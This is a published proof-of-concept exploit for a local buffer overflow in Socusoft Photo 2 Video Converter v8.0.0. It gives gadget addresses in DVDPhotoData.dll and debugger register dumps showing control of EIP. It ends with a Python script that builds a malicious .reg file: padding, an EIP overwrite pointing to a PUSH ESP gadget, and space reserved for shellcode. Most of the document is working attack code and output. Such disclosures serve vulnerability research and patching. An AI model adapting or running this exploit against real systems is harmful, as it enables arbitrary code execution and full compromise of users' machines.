# Exploit Title: Socusoft Photo 2 Video Converter v8.0.0 Local Buffer Overflow (Free and Professional variants) 
# Date: 01/12/2017
# Exploit Author: Jason Magic (ret2eax)
# Vendor Homepage: www.socusoft.com
# Version: 8.0.0
# Tested on: Windows Server 2008 R2

# Socusoft's Photo 2 Video Converter v8.0.0 (Free and Professional variants) 
# contains a local buffer overflow condition in the pdmlog.dll library. 
# Exploitation can result in register rewrites to control program execution 
# flow, therefore, resulting in the ability to execute arbitrary shellcode leading 
# to complete system compromise.

# Import generated .reg prior to restarting the executable within a debugger

#  The following PUSH ESP, RETN instruction sequence addresses are suitable to 
#  redirect program execution:
	
#  DVDPhotoData.dll:

#	0x10002352 push esp; ret
#	0x10013945 push esp; retn 0x0004
#	0x1004cb83 push esp; retn 0x0008
#	0x1004cbb8 push esp; retn 0x0008
#	0x1004cc11 push esp; retn 0x0008

# BEGIN EXPLOIT POC

#!/usr/bin/python
	
# REGISTERS (POC)
	
# EAX 42424242
# ECX 0002BF3B pdmlog.<ModuleEntryPoint>
# EDX 00020000 pdmlog.00020000
# EBX 00020000 pdmlog.00020000
# ESP 035BFB90
# EBP 035BFBAC
# ESI 00000002
# EDI 00000000
# EIP 42424242

# EAX 10013945 DVDPhoto.10013945
# ECX 0002BF3B pdmlog.<ModuleEntryPoint>
# EDX 00020000 pdmlog.00020000
# EBX 00020000 pdmlog.00020000
# ESP 03A0FB90
# EBP 03A0FBAC
# ESI 00000002
# EDI 00000000
# EIP 10013945 DVDPhoto.10013945 <- EIP Overwrite '\x45\x39\x01\x10' 

# outfile
file = "proof-of-concept.reg"

# register re-write
padding = "\x41" * 548
eipOffset = "\x45\x39\x01\x10" 	# PUSH ESP (0x10013945)
stackRewrite = "\x43" * 400 	# Shellcode Space

# generate exploit file containing above payload instructing EIP overwrite

poc = "Windows Registry Editor Version 5.00\n\n"
poc = poc + "[HKEY_CURRENT_USER\Software\Socusoft Photo to Video Converter Free Version\General]\n"
poc = poc + "\"TempFolder\"=\"" + padding + eipOffset + stackRewrite + "\""
 
try:
	print "[*] Generating exploit contents...\n";
	print "[*] Creating payload file...\n";
	writeFile = open (file, "w")
	writeFile.write( poc )
	writeFile.close()
	print "[*] Success!";
except:
	print "[!] ERROR!";

#EOF